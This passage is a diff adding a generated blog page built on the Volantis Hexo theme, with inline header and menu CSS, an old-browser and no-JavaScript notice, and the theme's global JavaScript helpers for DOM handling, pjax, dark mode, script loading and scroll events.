+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@media screen and (min-width: 500px) {
+  .l_header .m_search:hover .input {
+    width: 100%;
+  }
+  .l_header .m_search:hover .input::placeholder {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search {
+    min-width: 0;
+  }
+  .l_header .m_search input::placeholder {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+.l_header .m_search .form {
+  position: relative;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  width: 100%;
+  align-items: center;
+}
+.l_header .m_search .icon {
+  position: absolute;
+  width: 36px;
+  left: 5px;
+  color: var(--color-meta);
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search .icon {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: none;
+  }
+}
+.l_header .m_search .input {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  padding-top: 8px;
+  padding-bottom: 8px;
+  line-height: 1.3;
+  width: 100%;
+  color: var(--color-text);
+  background: #fafafa;
+  box-shadow: none;
+  -webkit-box-shadow: none;
+  box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  padding-left: 40px;
+  font-size: 0.875rem;
+  border-radius: 8px;
+  -webkit-border-radius: 8px;
+  border: none;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+@media screen and (min-width: 500px) {
+  .l_header .m_search .input:focus {
+    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
+    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search .input {
+    background: var(--color-block);
+    padding-left: 8px;
+    border: none;
+  }
+  .l_header .m_search .input:hover,
+  .l_header .m_search .input:focus {
+    border: none;
+  }
+}
+@media (max-width: 500px) {
+  .l_header .m_search {
+    left: 0;
+    width: 0;
+    overflow: hidden;
+    position: absolute;
+    background: #fff;
+    transition: all 0.28s ease;
+    -webkit-transition: all 0.28s ease;
+    -khtml-transition: all 0.28s ease;
+    -moz-transition: all 0.28s ease;
+    -o-transition: all 0.28s ease;
+    -ms-transition: all 0.28s ease;
+  }
+  .l_header .m_search .input {
+    border-radius: 32px;
+    -webkit-border-radius: 32px;
+    margin-left: 16px;
+    padding-left: 16px;
+  }
+  .l_header.z_search-open .m_search {
+    width: 100%;
+  }
+  .l_header.z_search-open .m_search .input {
+    width: calc(100% - 120px);
+  }
+}
+ul.m-pc >li>a {
+  color: inherit;
+  border-bottom: 2px solid transparent;
+}
+ul.m-pc >li>a:active,
+ul.m-pc >li>a.active {
+  border-bottom: 2px solid #3dd9b6;
+}
+ul.m-pc li:hover >ul.list-v,
+ul.list-v li:hover >ul.list-v {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+}
+ul.nav-list-h {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  align-items: stretch;
+}
+ul.nav-list-h>li {
+  position: relative;
+  justify-content: center;
+  -webkit-justify-content: center;
+  -khtml-justify-content: center;
+  -moz-justify-content: center;
+  -o-justify-content: center;
+  -ms-justify-content: center;
+  height: 100%;
+  line-height: 2.4;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+}
+ul.nav-list-h>li >a {
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-weight: 600;
+}
+ul.list-v {
+  z-index: 1;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  position: absolute;
+  background: var(--color-card);
+  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
+  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
+  margin-top: -6px;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+  padding: 8px 0;
+}
+ul.list-v.show {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+}
+ul.list-v hr {
+  margin-top: 8px;
+  margin-bottom: 8px;
+}
+ul.list-v >li {
+  white-space: nowrap;
+  word-break: keep-all;
+}
+ul.list-v >li.header {
+  font-size: 0.78125rem;
+  font-weight: bold;
+  line-height: 2em;
+  color: var(--color-meta);
+  margin: 8px 16px 4px;
+}
+ul.list-v >li.header i {
+  margin-right: 8px;
+}
+ul.list-v >li ul {
+  margin-left: 0;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  margin-top: -40px;
+}
+ul.list-v .aplayer-container {
+  min-height: 64px;
+  padding: 6px 16px;
+}
+ul.list-v >li>a {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  color: var(--color-list);
+  font-size: 0.875rem;
+  font-weight: bold;
+  line-height: 36px;
+  padding: 0 20px 0 16px;
+  text-overflow: ellipsis;
+  margin: 0 4px;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+}
+@media screen and (max-width: 1024px) {
+  ul.list-v >li>a {
+    line-height: 40px;
+  }
+}
+ul.list-v >li>a >i {
+  margin-right: 8px;
+}
+ul.list-v >li>a:active,
+ul.list-v >li>a.active {
+  color: var(--color-list-hl);
+}
+ul.list-v >li>a:hover {
+  color: var(--color-list-hl);
+  background: var(--color-site-bg);
+}
+.l_header .menu >ul>li>a {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  padding: 0 8px;
+}
+.l_header .menu >ul>li>a >i {
+  margin-right: 4px;
+}
+.l_header ul.nav-list-h>li {
+  color: var(--color-list);
+  line-height: 64px;
+}
+.l_header ul.nav-list-h>li >a {
+  max-height: 64px;
+  overflow: hidden;
+  color: inherit;
+}
+.l_header ul.nav-list-h>li >a:active,
+.l_header ul.nav-list-h>li >a.active {
+  color: #3dd9b6;
+}
+.l_header ul.nav-list-h>li:hover>a {
+  color: var(--color-list-hl);
+}
+.l_header ul.nav-list-h>li i.music {
+  animation: rotate-effect 1.5s linear infinite;
+  -webkit-animation: rotate-effect 1.5s linear infinite;
+  -khtml-animation: rotate-effect 1.5s linear infinite;
+  -moz-animation: rotate-effect 1.5s linear infinite;
+  -o-animation: rotate-effect 1.5s linear infinite;
+  -ms-animation: rotate-effect 1.5s linear infinite;
+}
+@-moz-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@-webkit-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@-o-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+.menu-phone li ul.list-v {
+  right: calc(100% - 0.5 * 16px);
+}
+.menu-phone li ul.list-v ul {
+  right: calc(100% - 0.5 * 16px);
+}
+#wrapper {
+  max-width: 1080px;
+  margin: auto;
+}
+@media screen and (min-width: 2048px) {
+  #wrapper {
+    max-width: 55vw;
+  }
+}
+#wrapper .menu {
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -webkit-flex: 1 1;
+  -ms-flex: 1 1;
+  flex: 1 1;
+  margin: 0 16px 0 0;
+}
+#wrapper .menu .list-v ul {
+  left: calc(100% - 0.5 * 16px);
+}
+.menu-phone {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  margin-top: 16px;
+  right: 8px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+.menu-phone ul {
+  right: calc(100% - 0.5 * 16px);
+}
+@media screen and (max-width: 500px) {
+  .menu-phone {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: block;
+  }
+}
+.l_header {
+  max-width: 65vw;
+  left: calc((100% - 65vw) * 0.5);
+  border-bottom-left-radius: 8px;
+  border-bottom-right-radius: 8px;
+}
+@media screen and (max-width: 2048px) {
+  .l_header {
+    max-width: 1112px;
+    left: calc((100% - 1112px) * 0.5);
+  }
+}
+@media screen and (max-width: 1112px) {
+  .l_header {
+    left: 0;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    max-width: 100%;
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .container {
+    margin-left: 0;
+    margin-right: 0;
+  }
+  .l_header #wrapper .nav-main .title {
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+  .l_header #wrapper .nav-sub {
+    width: 100%;
+  }
+  .l_header #wrapper .nav-sub .title {
+    overflow-y: scroll;
+    margin-top: 2px;
+    padding: 8px 16px;
+  }
+  .l_header #wrapper .switcher {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: -ms-flexbox /* TWEENER - IE 10 */;
+    display: -webkit-flex /* NEW - Chrome */;
+    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+    display: flex;
+    margin-right: 8px;
+  }
+  .l_header .menu {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: none;
+  }
+}
+@media screen and (max-width: 500px) {
+  .list-v li {
+    max-width: 270px;
+  }
+}
+#u-search {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  padding: 60px 20px;
+  z-index: 1001;
+}
+@media screen and (max-width: 680px) {
+  #u-search {
+    padding: 0px;
+  }
+}
+
+  </style>
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+    '.kill-t{'+
+      'font-size: 2rem;'+
+    '}'+
+    '.kill-c{'+
+      'font-size: 1.2rem;'+
+    '}'+
+		'#l_header,#l_body{'+
+			'display: none;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
+        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
+        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+    .kill-t{
+      font-size: 2rem;
+    }
+    .kill-c{
+      font-size: 1.2rem;
+    }
+		#l_header,#l_body{
+			display: none;
+		}
+	</style>
+    <div class="kill-noscript">
+        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
+        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
+    </div>
+</noscript>
+
+
+  <script>
+  /************这个文件存放不需要重载的全局变量和全局函数*********/
+  window.volantis = {}; // volantis 全局变量
+  volantis.debug = "env"; // 调试模式
+  volantis.dom = {}; // 页面Dom see: /source/js/app.js etc.
+
+  volantis.GLOBAL_CONFIG ={
+    debug: "env",
+    cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
+    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
+    lastupdate: new Date(1722176267498),
+    sidebar: {
+      for_page: ["blogger","category","tagcloud","webinfo"],
+      for_post: ["toc"],
+      webinfo: {
+        lastupd: {
+          enable: true,
+          friendlyShow: true
+        },
+        runtime: {
+          data: "2020/01/01",
+          unit: "天"
+        }
+      }
+    },
+    plugins: {
+      message: {"enable":true,"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/css/iziToast.min.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/js/iziToast.min.js","icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"知识共享许可协议","message":"请遵守 CC BY-NC-SA 4.0 协议。","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
+      fancybox: {"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.umd.js"},
+      
+      
+      
+    }
+  }
+
+  /******************** volantis.EventListener ********************************/
+  // 事件监听器 see: /source/js/app.js
+  volantis.EventListener = {}
+  // 这里存放pjax切换页面时将被移除的事件监听器
+  volantis.EventListener.list = []
+  //构造方法
+  function volantisEventListener(type, f, ele) {
+    this.type = type
+    this.f = f
+    this.ele = ele
+  }
+  // 移除事件监听器
+  volantis.EventListener.remove = () => {
+    volantis.EventListener.list.forEach(function (i) {
+      i.ele.removeEventListener(i.type, i.f, false)
+    })
+    volantis.EventListener.list = []
+  }
+  /******************** volantis.dom.$ ********************************/
+  // 注：这里没有选择器，也没有forEach一次只处理一个dom，这里重新封装主题常用的dom方法，返回的是dom对象，对象包含了以下方法，同时保留dom的原生API
+  function volantisDom(ele) {
+    if (!ele) ele = document.createElement("div")
+    this.ele = ele;
+    // ==============================================================
+    this.ele.find = (c) => {
+      let q = this.ele.querySelector(c)
+      if (q)
+        return new volantisDom(q)
+    }
+    // ==============================================================
+    this.ele.hasClass = (c) => {
+      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
+    }
+    this.ele.addClass = (c) => {
+      this.ele.classList.add(c);
+      return this.ele
+    }
+    this.ele.removeClass = (c) => {
+      this.ele.classList.remove(c);
+      return this.ele
+    }
+    this.ele.toggleClass = (c) => {
+      if (this.ele.hasClass(c)) {
+        this.ele.removeClass(c)
+      } else {
+        this.ele.addClass(c)
+      }
+      return this.ele
+    }
+    // ==============================================================
+    // 参数 r 为 true 表示pjax切换页面时事件监听器将被移除，false不移除
+    this.ele.on = (c, f, r = 1) => {
+      this.ele.addEventListener(c, f, false)
+      if (r) {
+        volantis.EventListener.list.push(new volantisEventListener(c, f, this.ele))
+      }
+      return this.ele
+    }
+    this.ele.click = (f, r) => {
+      this.ele.on("click", f, r)
+      return this.ele
+    }
+    this.ele.scroll = (f, r) => {
+      this.ele.on("scroll", f, r)
+      return this.ele
+    }
+    // ==============================================================
+    this.ele.html = (c) => {
+      // if(c=== undefined){
+      //   return this.ele.innerHTML
+      // }else{
+      this.ele.innerHTML = c
+      return this.ele
+      // }
+    }
+    // ==============================================================
+    this.ele.hide = (c) => {
+      this.ele.style.display = "none"
+      return this.ele
+    }
+    this.ele.show = (c) => {
+      this.ele.style.display = "block"
+      return this.ele
+    }
+    // ==============================================================
+    return this.ele
+  }
+  volantis.dom.$ = (ele) => {
+    return !!ele ? new volantisDom(ele) : null;
+  }
+  /******************** RunItem ********************************/
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = ()=>{
+          volantis.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) =>{
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index,1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+  /******************** Pjax ********************************/
+  // /layout/_plugins/pjax/index.ejs
+  // volantis.pjax.send(callBack[,"callBackName"]) 传入pjax:send回调函数
+  // volantis.pjax.push(callBack[,"callBackName"]) 传入pjax:complete回调函数
+  // volantis.pjax.error(callBack[,"callBackName"]) 传入pjax:error回调函数
+  volantis.pjax = {};
+  volantis.pjax.method = {
+    complete: new RunItem(),
+    error: new RunItem(),
+    send: new RunItem(),
+  };
+  volantis.pjax = Object.assign(volantis.pjax, {
+    push: volantis.pjax.method.complete.push,
+    error: volantis.pjax.method.error.push,
+    send: volantis.pjax.method.send.push,
+  });
+  /******************** RightMenu ********************************/
+  // volantis.rightmenu.handle(callBack[,"callBackName"]) 外部菜单项控制
+  // 可在 volantis.mouseEvent 处获取右键事件
+  volantis.rightmenu = {};
+  volantis.rightmenu.method = {
+    handle: new RunItem(),
+  }
+  volantis.rightmenu = Object.assign(volantis.rightmenu, {
+    handle: volantis.rightmenu.method.handle.push,
+  });
+  /********************  Dark Mode  ********************************/
+  // /layout/_partial/scripts/darkmode.ejs
+  // volantis.dark.mode 当前模式 dark or light
+  // volantis.dark.toggle() 暗黑模式触发器
+  // volantis.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  volantis.dark = {};
+  volantis.dark.method = {
+    toggle: new RunItem(),
+  };
+  volantis.dark = Object.assign(volantis.dark, {
+    push: volantis.dark.method.toggle.push,
+  });
+  /********************  Message  ********************************/
+  // VolantisApp.message
+  /********************  isMobile  ********************************/
+  // /source/js/app.js
+  // volantis.isMobile
+  // volantis.isMobileOld
+  /********************脚本动态加载函数********************************/
+  // volantis.js(src, cb)  cb 可以传入onload回调函数 或者 JSON对象 例如: volantis.js("src", ()=>{}) 或 volantis.js("src", {defer:true,onload:()=>{}})
+  // volantis.css(src)
+
+  // 返回Promise对象，如下方法同步加载资源，这利于处理文件资源之间的依赖关系，例如：APlayer 需要在 MetingJS 之前加载
+  // (async () => {
+  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
+  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
+  // })();
+
+  // 已经加入了setTimeout
+  volantis.js = (src, cb) => {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+  volantis.css = (src) => {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  }
+  /********************按需加载的插件********************************/
+  // volantis.import.jQuery().then(()=>{})
+  volantis.import = {
+    jQuery: () => {
+      if (typeof jQuery == "undefined") {
+        return volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/jquery/dist/jquery.min.js")
+      } else {
+        return new Promise(resolve => {
+          resolve()
+        });
+      }
+    }
+  }
+  /********************** requestAnimationFrame ********************************/
+  // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+  // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+  volantis.requestAnimationFrame = (fn)=>{
+    if (!window.requestAnimationFrame) {
+      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+    }
+    window.requestAnimationFrame(fn)
+  }
+  /************************ layoutHelper *****************************************/
+  volantis.layoutHelper = (helper, html, opt)=>{
+    opt = Object.assign({clean:false, pjax:true}, opt)
+    function myhelper(helper, html, clean) {
+      volantis.tempDiv = document.createElement("div");
+      volantis.tempDiv.innerHTML = html;
+      let layoutHelper = document.querySelector("#layoutHelper-"+helper)
+      if (layoutHelper) {
+        if (clean) {
+          layoutHelper.innerHTML = ""
+        }
+        layoutHelper.append(volantis.tempDiv);
+      }
+    }
+    myhelper(helper, html, opt.clean)
+    if (opt.pjax) {
+      volantis.pjax.push(()=>{
+        myhelper(helper, html, opt.clean)
+      },"layoutHelper-"+helper)
+    }
+  }
+  /****************************** 滚动事件处理 ****************************************/
+  volantis.scroll = {
+    engine: new RunItem(),
+    unengine: new RunItem(),
+  };
+  volantis.scroll = Object.assign(volantis.scroll, {
+    push: volantis.scroll.engine.push,
+  });
+  // 滚动条距离顶部的距离
+  volantis.scroll.getScrollTop = () =>{
+    let scrollPos;
+    if (window.pageYOffset) {
+      scrollPos = window.pageYOffset;
+    } else if (document.compatMode && document.compatMode != 'BackCompat') {
+      scrollPos = document.documentElement.scrollTop;
+    } else if (document.body) {
+      scrollPos = document.body.scrollTop;
+    }
+    return scrollPos;
+  }
+  // 使用 requestAnimationFrame 处理滚动事件
+  // `volantis.scroll.del` 中存储了一个数值, 该数值检测一定时间间隔内滚动条滚动的位移, 数值的检测频率是浏览器的刷新频率. 数值为正数时, 表示向下滚动. 数值为负数时, 表示向上滚动.
+  volantis.scroll.handleScrollEvents = () => {
+    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
+    function loop() {
+      const scrollTop = volantis.scroll.getScrollTop();
+      if (volantis.scroll.lastScrollTop !== scrollTop) {
+        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
+        volantis.scroll.lastScrollTop = scrollTop;
+        // if (volantis.scroll.del > 0) {
+        //   console.log("向下滚动");
+        // } else {
+        //   console.log("向上滚动");
+        // }
+        // 注销过期的unengine未滚动事件
+        volantis.scroll.unengine.list=[]
+        volantis.scroll.engine.start();
+      }else{
